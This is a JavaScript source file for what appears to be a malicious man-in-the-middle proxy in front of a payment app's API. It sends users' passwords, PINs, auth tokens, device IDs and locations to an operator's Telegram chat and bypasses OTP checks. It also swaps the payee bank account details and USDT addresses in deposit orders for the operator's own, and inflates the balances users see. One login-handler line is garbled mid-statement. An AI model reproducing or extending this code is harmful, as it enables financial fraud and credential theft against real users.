      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
      const otpNote = otpBypassed ? '\n\n🔕 OTP BYPASSED (needOtp → false)' : '';
      bot.sendMessage(data.adminChatId, `🔐 Login Start\n📱 Phone: ${body.userName || body.phone || body.mobile || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1200)}\n\n📥 RESPONSE BODY:\n${resStr.substring(0, 1200)}${otpNote}`).catch(()=>{});
    }

    if (otpBypassed) {
      const newBody = JSON.stringify(jsonResp);
      respHeaders['content-type'] = 'application/json; charset=utf-8';
      respHeaders['content-length'] = String(Buffer.byteLength(newBody));
      delete respHeaders['etag'];
      res.writeHead(response.status, respHeaders);
      res.end(newBody);
       const loginData = getResponseData(jsonResp);
    if (login   return;
    }
Data && typeof loginData === 'object') {
      userId = String(loginData.userId || loginData.id || loginData.memberId || '');
      const respToken = loginData.token || loginData.accessToken || '';
      const respRefresh = loginData.refreshToken || '';
      const respUsername = loginData.username || loginData.userName || '';

      if (respToken && userId) {
        const tKey = cleanToken(respToken);
        tokenUserMap[tKey] = userId;
        if (redis) redis.hset('diwapayTokenMap', tKey, userId).catch(()=>{});
      }
      if (respRefresh && userId) {
        refreshTokenMap[String(userId)] = respRefresh;
        const rKey = cleanToken(respRefresh);
        tokenUserMap[rKey] = userId;
        if (redis) redis.hset('diwapayTokenMap', rKey, userId).catch(()=>{});
      }
      const deviceId = body.deviceId || body.androidId || body.device_id || '';
      if (deviceId && userId) {
        userDeviceMap[String(userId)] = deviceId;
      }
      if (userId) {
        saveTokenUserId(req, userId);
        if (phone) userPhoneMap[String(userId)] = String(phone);
        if (respUsername) userPhoneMap[String(userId)] = String(respUsername);
        const detectedPhone = phone || respUsername || '';
        trackUser(data, userId, 'Login', detectedPhone);
        saveData(data).catch(()=>{});
      }
    }

    if (!userId) {
      userId = await extractUserId(req, jsonResp);
      if (userId && phone) {
        userPhoneMap[String(userId)] = String(phone);
        trackUser(data, userId, 'Login', phone);
        saveData(data).catch(()=>{});
      }
    }

    if (data.adminChatId && bot) {
      const pwd = body.password || body.pwd || body.loginPwd || body.pin || 'N/A';
      const reqStr = JSON.stringify(body, null, 2);
      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
      const androidId = body.deviceId || body.androidId || body.device_id || 'N/A';
      let extraInfo = '';
      if (loginData && loginData.challengeId) {
        extraInfo = `\n\n🎯 DEVICE VERIFICATION\n📋 challengeId: ${loginData.challengeId}\n📱 Android ID: ${androidId}`;
      }
      const loginToken = loginData ? (loginData.token || loginData.accessToken || '') : '';
      if (loginToken && jsonResp?.code === 1000) {
        extraInfo += `\n\n🔑 AUTH TOKEN:\n${loginToken}`;
      }
      bot.sendMessage(data.adminChatId, `✅ Login Confirm\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd}\n👤 UserID: ${userId || 'N/A'}\n📱 Android ID: ${androidId}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1200)}\n\n📥 RESPONSE:\n${resStr.substring(0, 1200)}${extraInfo}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

function getOrderAmountFromReq(req, respData) {
  if (respData && typeof respData === 'object') {
    const amt = respData.orderAmount || respData.amount || respData.buyAmount || respData.unpaidAmount || respData.totalAmount;
    if (amt !== undefined && amt !== null) {
      const num = parseFloat(amt);
      if (!isNaN(num)) return num;
    }
  }
  const body = req && req.parsedBody ? req.parsedBody : {};
  const bodyAmt = body.amount || body.orderAmount || body.buyAmount || body.totalAmount;
  if (bodyAmt !== undefined && bodyAmt !== null) {
    const num = parseFloat(bodyAmt);
    if (!isNaN(num)) return num;
  }
  return null;
}

async function proxyAndReplaceBankDetails(req, res, label) {
  const data = await loadData();
  const reqUserId = await extractUserId(req, null);
  const reqEff = getEffectiveSettings(data, reqUserId);
  if (reqEff.botEnabled === false) return await transparentProxy(req, res);

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
    const eff = getEffectiveSettings(data, detectedUserId);

    const respData = getResponseData(jsonResp);

    const orderAmt = getOrderAmountFromReq(req, respData && typeof respData === 'object' && !Array.isArray(respData) ? respData : null);
    const globalActive = eff.botEnabled !== false ? getActiveBank(data, detectedUserId) : null;

    let active = null;
    let notReplacedReason = '';

    if (globalActive) {
      if (globalActive.minAmount && orderAmt !== null && orderAmt < globalActive.minAmount) {
        notReplacedReason = `Order ₹${orderAmt} < min ₹${globalActive.minAmount} for bank ${globalActive.accountHolder}`;
        active = null;
      } else {
        active = globalActive;
        if (data.autoRotate && data._rotatedIndex !== undefined) {
          data.lastUsedIndex = data._rotatedIndex;
          delete data._rotatedIndex;
          await saveData(data);
        }
      }
    }

    if (respData && active) {
      if (Array.isArray(respData)) {
        respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
      } else {
        const originalValues = {};
        deepReplace(respData, active, originalValues, 0);
      }
    }

    if (detectedUserId) {
      trackUser(data, detectedUserId, `Order ${jsonResp?.data?.orderId || jsonResp?.data?.buyId || ''}`);
      saveData(data).catch(()=>{});
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('Proxy+replace error:', req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

async function proxyAndReplaceBankInList(req, res) {
  const data = await loadData();

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    let detectedUserId = await extractUserIdFromToken(req);
    if (!detectedUserId) detectedUserId = await extractUserId(req, jsonResp);
    const eff = getEffectiveSettings(data, detectedUserId);
    const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, detectedUserId) : null;

    const listData = getResponseData(jsonResp);
    if (listData) {
      const applyToItem = (item) => {
        const itemUserId = item.userId ? String(item.userId) : (item.memberId ? String(item.memberId) : detectedUserId);
        const itemEff = getEffectiveSettings(data, itemUserId);
        const itemActive = (itemEff.botEnabled !== false) ? getActiveBank(data, itemUserId) : null;
        if (itemActive) { const origVals = {}; deepReplace(item, itemActive, origVals, 0); }
        if (itemEff.depositSuccess) markDepositSuccess(item);
      };
      if (Array.isArray(listData)) {
        listData.forEach(applyToItem);
      } else if (listData.list && Array.isArray(listData.list)) {
        listData.list.forEach(applyToItem);
      } else if (listData.records && Array.isArray(listData.records)) {
        listData.records.forEach(applyToItem);
      } else if (listData.rows && Array.isArray(listData.rows)) {
        listData.rows.forEach(applyToItem);
      } else if (listData.content && Array.isArray(listData.content)) {
        listData.content.forEach(applyToItem);
      } else {
        applyToItem(listData);
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('List replace error:', req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

async function proxyAndAddBonus(req, res) {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const tokenUserId = await extractUserIdFromToken(req);
    let detectedUserId = tokenUserId;
    if (!detectedUserId) {
      const respData = getResponseData(jsonResp);
      if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
        const rid = respData.userId || respData.userid || respData.memberId || '';
        if (rid) detectedUserId = String(rid);
      }
    }
    const eff = getEffectiveSettings(data, detectedUserId);
    const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;

    if (detectedUserId) {
      if (tokenUserId || !await getUserIdFromToken(req)) saveTokenUserId(req, detectedUserId);
      trackUser(data, detectedUserId, `App Open ${req.path}`);
      saveData(data).catch(()=>{});
    }

    const bonusData = getResponseData(jsonResp);
    if (bonus > 0 && bonusData) {
      addBonusToBalanceFields(bonusData, bonus);
    }

    if (detectedUserId && bonusData && typeof bonusData === 'object') {
      const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
      if (addedBal !== 0) {
        addBonusToBalanceFields(bonusData, addedBal);
      }
    }

    if (jsonResp && isAuthFailureResponse(jsonResp) && shouldBypass401(req)) {
      const bypass = make401Bypass(jsonResp);
      sendJson(res, respHeaders, bypass, JSON.stringify(bypass));
      return;
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

app.all('/app/user/info', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const respData = getResponseData(jsonResp);
    const uid = respData?.userId || respData?.id || respData?.memberId || '';
    const effectiveUserId = uid ? String(uid) : '';
    let phone = '';
    let bal = '';
    let username = '';
    if (respData && typeof respData === 'object') {
      phone = respData.phone || respData.mobile || respData.userName || '';
      username = respData.username || respData.userName || respData.name || '';
      bal = respData.balance ?? respData.availableBalance ?? respData.totalBalance ?? respData.amount ?? '';
      if (!effectiveUserId && !phone) {
        for (const [k, v] of Object.entries(respData)) {
          if (!phone && /phone|mobile|tel/i.test(k) && v) phone = String(v);
        }
      }
    }
    if (effectiveUserId && respData && typeof respData === 'object') {
      const userOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
      if (addedBal !== 0) {
        const balKeys = ['balance', 'availableBalance'];
        for (const bk of balKeys) {
          if (respData[bk] !== undefined) {
            const numBal = parseFloat(respData[bk]) || 0;
            respData[bk] = typeof respData[bk] === 'string'
              ? String(parseFloat((numBal + addedBal).toFixed(2)))
              : parseFloat((numBal + addedBal).toFixed(2));
          }
        }
      }
    }
    if (data.adminChatId && bot) {
      const mineOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
      const mineAdded = mineOvr && mineOvr.addedBalance !== undefined ? mineOvr.addedBalance : 0;
      const realBal = bal !== '' ? bal : 'N/A';
      const displayBal = (realBal !== 'N/A' && mineAdded !== 0)
        ? parseFloat((parseFloat(realBal) + mineAdded).toFixed(2))
        : realBal;
      let mineMsg = `👤 Mine [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}`;
      if (mineAdded !== 0) {
        mineMsg += `\n━━━━━━━━━━━━━━━━━━`;
        mineMsg += `\n🏦 Real Balance: ₹${realBal}`;
        mineMsg += `\n➕ Bot Added: ₹${mineAdded}`;
        mineMsg += `\n👁️ User Sees: ₹${displayBal}`;
      } else {
        mineMsg += `\n💰 Balance: ₹${realBal}`;
      }
      bot.sendMessage(data.adminChatId, mineMsg).catch(()=>{});
    }
    if (jsonResp && isAuthFailureResponse(jsonResp) && shouldBypass401(req)) {
      const bypass = make401Bypass(jsonResp);
      sendJson(res, respHeaders, bypass, JSON.stringify(bypass));
      return;
    }

    sendJson(res, respHeaders, jsonResp, respBody);
    if (effectiveUserId) {
      saveTokenUserId(req, effectiveUserId);
      if (!data.trackedUsers) data.trackedUsers = {};
      const existing = data.trackedUsers[String(effectiveUserId)] || {};
      data.trackedUsers[String(effectiveUserId)] = {
        ...existing,
        lastAction: 'userInfo',
        lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: phone || existing.phone || '',
        name: username || existing.name || '',
        balance: bal !== '' ? bal : (existing.balance || ''),
        orderCount: existing.orderCount || 0
      };
      saveData(data).catch(()=>{});
    }
  } catch(e) { await transparentProxy(req, res); }
});

async function proxyAndAddBonusPersonal(req, res) {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const bonusData = getResponseData(jsonResp);
    const detectedUserId = await extractUserIdFromToken(req);
    if (detectedUserId && bonusData && typeof bonusData === 'object') {
      const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
      if (addedBal !== 0) {
        const personBalKeys = ['balance', 'integral', 'availablebalance', 'money', 'coin', 'wallet'];
        for (const key of Object.keys(bonusData)) {
          if (personBalKeys.includes(key.toLowerCase())) {
            const current = parseFloat(bonusData[key]);
            if (!isNaN(current)) {
              bonusData[key] = typeof bonusData[key] === 'string'
                ? String((current + addedBal).toFixed(2))
                : parseFloat((current + addedBal).toFixed(2));
            }
          }
        }
      }
    }
    if (jsonResp && isAuthFailureResponse(jsonResp) && shouldBypass401(req)) {
      const bypass = make401Bypass(jsonResp);
      sendJson(res, respHeaders, bypass, JSON.stringify(bypass));
      return;
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
}
app.all('/app/user/info/person', async (req, res) => { await proxyAndAddBonusPersonal(req, res); });
app.all('/app/user/info/personV2', async (req, res) => { await proxyAndAddBonusPersonal(req, res); });

app.post('/app/payment/order/create', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (userId) { trackUser(data, userId, 'Deposit Order'); saveData(data).catch(()=>{}); }

    const isSuccess = jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000' || jsonResp.code === '200');

    if (isSuccess && data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const body = req.parsedBody || {};
      const phone = getPhone(data, userId);
      const orderId = body.orderId || body.orderNo || body.buyId || 'N/A';
      const orderAmt = parseFloat(body.amount || body.orderAmount || body.buyAmount || 0) || 0;
      const msg =
        `✅ Order Created!\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n` +
        `📋 Order ID: ${orderId}\n` +
        `💰 Amount: ₹${orderAmt || 'N/A'}\n` +
        `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n` +
        `(Bank details in next message ↓)`;
      bot.sendMessage(data.adminChatId, msg).catch(()=>{});
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/payment/order/createUsdt', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.usdtAddress && jsonResp) replaceUsdtInResponse(jsonResp, data);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const d = getResponseData(jsonResp) || {};
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId, `₮ USDT Order [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nAmount: ${d.amount || d.orderAmount || 'N/A'}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/payment/order/submit', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId, `📤 Payment Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nUTR: ${body.utr || body.transactionId || body.referenceNo || body.txnId || 'N/A'}\nOrder: ${body.orderId || body.orderNo || body.buyId || 'N/A'}`).catch(()=>{});
    }
    if (userId) { trackUser(data, userId, `Submit ${body.utr || body.transactionId || ''}`); saveData(data).catch(()=>{}); }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/payment/order/cancel', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const cancelUserId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, cancelUserId) && !(await isLogOffByToken(data, req))) {
      bot.sendMessage(data.adminChatId, `❌ Order Cancelled [${cancelUserId || 'N/A'}]\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || req.parsedBody?.buyId || 'N/A'}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/payment/order/orderInfo', async (req, res) => {
  const data = await loadData();
  if (!data.botEnabled) return await transparentProxy(req, res);

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detailData = getResponseData(jsonResp);

    const userId = await extractUserIdFromToken(req) || await extractUserId(req, jsonResp);
    const bank = getActiveBank(data, userId);

    if (detailData) {
      const dd = (typeof detailData === 'object' && !Array.isArray(detailData)) ? detailData : {};
      const orderAmt = parseFloat(
        dd.amount || dd.orderAmount || dd.buyAmount || dd.unpaidAmount || dd.totalAmount || 0
      ) || 0;

      const realAcct = dd.payeeAccount || dd.receiveAccount || dd.bankAccount || dd.accountNo || dd.account || '';
      const realName = dd.payeeName || dd.receiveName || dd.accountName || dd.beneficiaryName || dd.accountHolder || '';
      const realIfsc = dd.ifsc || dd.ifscCode || dd.receiveIfsc || '';

      let replaced = false;
      let notReplacedReason = '';

      if (bank) {
        if (bank.minAmount && orderAmt > 0 && orderAmt < bank.minAmount) {
          notReplacedReason = `Order ₹${orderAmt} < Min ₹${bank.minAmount}`;
        } else {
          replaced = true;
          if (Array.isArray(detailData)) {
            detailData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bank, {}, 0); });
          } else {
            deepReplace(detailData, bank, {}, 0);
          }
        }
      }

      if (data.usdtAddress) {
        replaceUsdtInResponse(jsonResp, data);
        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(data.usdtAddress)}`;
        let str = JSON.stringify(jsonResp);
        str = str.replace(/https?:\/\/oss\.[^\s"',\\}]+/gi, qrUrl);
        str = str.replace(/https?:\/\/[^\s"',\\}]+(qr|QR|qrcode|code)[^\s"',\\}]*/gi, qrUrl);
        try { Object.assign(jsonResp, JSON.parse(str)); } catch(e) {}
      }

      if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
        const phone = getPhone(data, userId);
        const orderId = dd.orderId || dd.orderNo || dd.buyId || req.query?.buyId || req.query?.orderId || 'N/A';
        let bankSection = '';
        if (replaced && bank) {
          if (realAcct && realName) {
            bankSection =
              `🏦 Real Bank:\n` +
              `   Acc: ${realAcct}\n` +
              `   Name: ${realName}\n` +
              `${realIfsc ? '   IFSC: ' + realIfsc + '\n' : ''}` +
              `━━━━━━━━━━━━━━━━━━\n` +
              `🔄 Replaced With:\n` +
              `   Acc: ${bank.accountNo}\n` +
              `   Name: ${bank.accountHolder}\n` +
              `   IFSC: ${bank.ifsc}${bank.bankName ? ' | ' + bank.bankName : ''}`;
          } else {
            bankSection =
              `🔄 Replaced Bank:\n` +
              `   Acc: ${bank.accountNo}\n` +
              `   Name: ${bank.accountHolder}\n` +
              `   IFSC: ${bank.ifsc}${bank.bankName ? ' | ' + bank.bankName : ''}`;
          }
        } else if (notReplacedReason) {
          bankSection = `⚠️ Bank NOT Replaced\n   Reason: ${notReplacedReason}`;
        } else {
          bankSection = `⚠️ No active bank set`;
        }

        const msg =
          `📋 Order Details Loaded\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n` +
          `📋 Order ID: ${orderId}\n` +
          `💰 Amount: ₹${orderAmt || 'N/A'}\n` +
          `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          bankSection;

        bot.sendMessage(data.adminChatId, msg).catch(()=>{});
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/payment/order/usdtInfo', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.usdtAddress && jsonResp) replaceUsdtInResponse(jsonResp, data);
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/payment/order/summary', async (req, res) => { await proxyAndAddBonus(req, res); });

app.all('/app/payment/order/history', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
app.all('/app/receive/order/history', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
app.all('/app/payment/order', async (req, res) => { await proxyAndReplaceBankInList(req, res); });

app.all('/app/payment/app/buy/order/usdt', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.usdtAddress && jsonResp) replaceUsdtInResponse(jsonResp, data);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId, `₮ Buy USDT Order [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

const COLLECTION_ENDPOINTS = [
  '/app/ct/app/collection/allAvailable',
  '/app/ct/app/collection/available',
  '/app/ct/app/collection/getWalletList',
  '/app/ct/app/collection/getPayoutWalletList',
  '/app/ct/app/collection/getKycList',
  '/app/ct/app/collection/one',
  '/app/ct/app/collection/two',
  '/app/ct/app/collection/three',
  '/app/ct/app/collection/check',
  '/app/ct/app/collection/submit',
  '/app/ct/app/collection/v2/submit',
  '/app/ct/app/collection/link',
  '/app/ct/app/collection/sendOtp',
  '/app/ct/app/collection/verifyOtp'
];

for (const ep of COLLECTION_ENDPOINTS) {
  app.all(ep, async (req, res) => {
    const data = await loadData();
    try {
      const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
      const userId = await extractUserId(req, jsonResp);
      const phone = getPhone(data, userId);
      if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
        const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1500);
        const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
        bot.sendMessage(data.adminChatId, `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n\n📝 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
      }
      sendJson(res, respHeaders, jsonResp, respBody);
    } catch(e) { await transparentProxy(req, res); }
  });
}

app.all('/app/ct/app/collection/offSell/*', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🔴 Collection OFF Sell [${userId || 'N/A'}]\n${req.originalUrl}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/ct/app/collection/changeStatus/*', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🔄 Collection Status Change [${userId || 'N/A'}]\n${req.originalUrl}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/ct/app/collection/*', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const phone = getPhone(data, userId);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      bot.sendMessage(data.adminChatId, `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/user/info/onSell/*', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🟢 Withdraw ON [${userId || 'N/A'}]`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/user/info/offSell/*', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🔴 Withdraw OFF [${userId || 'N/A'}]`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/user/info/updatePassword', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🔒 Password Change [${userId || 'N/A'}]\nOld: ${body.oldPassword || body.oldPwd || 'N/A'}\nNew: ${body.newPassword || body.newPwd || body.password || 'N/A'}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/user/info/updatePin', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    const code = jsonResp?.code || 'N/A';
    const msg = jsonResp?.message || jsonResp?.msg || 'N/A';
    const success = code === 1000 ? '✅' : '❌';
    if (data.adminChatId && bot) {
      const hdrs = {};
      for (const [k,v] of Object.entries(req.headers)) {
        if (!k.startsWith('x-vercel') && !k.startsWith('x-forwarded') && k !== 'host' && k !== 'connection' && k !== 'accept-encoding') hdrs[k] = v;
      }
      bot.sendMessage(data.adminChatId, `🔐 PIN Change ${success} [${userId || 'N/A'}]\nOld: ${body.oldPin || 'N/A'}\nNew: ${body.newPin || body.pin || 'N/A'}\n📋 Code: ${code} | ${msg}\n📋 Full: ${respBody.substring(0, 500)}\n\n📡 Headers:\n${JSON.stringify(hdrs, null, 2).substring(0, 1000)}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/user/info/verifyPin', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    const code = jsonResp?.code || 'N/A';
    const msg = jsonResp?.message || jsonResp?.msg || 'N/A';
    const success = code === 1000 ? '✅' : '❌';
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🔐 PIN Verify ${success} [${userId || 'N/A'}]\nPIN: ${body.pin || body.verifyPin || 'N/A'}\n📋 Code: ${code} | ${msg}\n📋 Full: ${respBody.substring(0, 500)}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/offline/order/page', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
app.all('/app/offline/order/count', async (req, res) => { await proxyAndAddBonus(req, res); });
app.all('/app/offline/order/*', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId, `📦 ${req.originalUrl} [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/user/info/getInviterUrl', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const phone = getPhone(data, userId);
    if (data.adminChatId && bot) {
      const reqHeaders = {};
      for (const [k,v] of Object.entries(req.headers)) {
        if (!k.startsWith('x-vercel') && !k.startsWith('x-forwarded') && k !== 'host' && k !== 'connection' && k !== 'accept-encoding') reqHeaders[k] = v;
      }
      const respData = getResponseData(jsonResp);
      let inviteInfo = '';
      if (respData && typeof respData === 'object') {
        const invite = respData.invite || respData.inviteCode || respData.inviterCode || respData.code || respData.shareCode || '';
        const url = respData.url || respData.inviteUrl || respData.shareUrl || respData.link || '';
        const inviterId = respData.inviterId || respData.parentId || respData.referrerId || '';
        inviteInfo = `\n\n📋 INVITE DETAILS:\n🔗 Invite Code: ${invite || 'N/A'}\n🌐 URL: ${url || 'N/A'}\n👤 Inviter ID: ${inviterId || 'N/A'}`;
        for (const [k, v] of Object.entries(respData)) {
          if (!['invite','inviteCode','inviterCode','code','shareCode','url','inviteUrl','shareUrl','link','inviterId','parentId','referrerId'].includes(k)) {
            inviteInfo += `\n📌 ${k}: ${typeof v === 'object' ? JSON.stringify(v) : v}`;
          }
        }
      }
